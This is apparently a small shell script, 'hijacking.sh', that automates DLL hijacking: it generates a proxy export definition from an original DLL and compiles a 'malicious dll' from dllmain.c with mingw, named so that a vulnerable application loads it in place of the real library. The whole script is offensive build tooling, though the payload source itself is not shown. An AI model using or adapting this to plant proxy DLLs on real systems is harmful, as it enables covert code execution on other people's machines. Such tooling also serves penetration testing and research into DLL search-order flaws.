if (($# != 2)); then
    echo "usage: ./hijacking.sh in.dll out.dll"
    echo "  in.dll: must exists in the current dir, the original dll file which the app want to load, named as you like"
    echo "  out.dll: the malicious dll file generated, named by the dll which the app want to load to cheat the vulnerable"
    exit
fi
source myEnv/bin/activate
python3 gen_def.py $1 > proxy.def
x86_64-w64-mingw32-gcc -shared -o $2 dllmain.c proxy.def -s
deactivate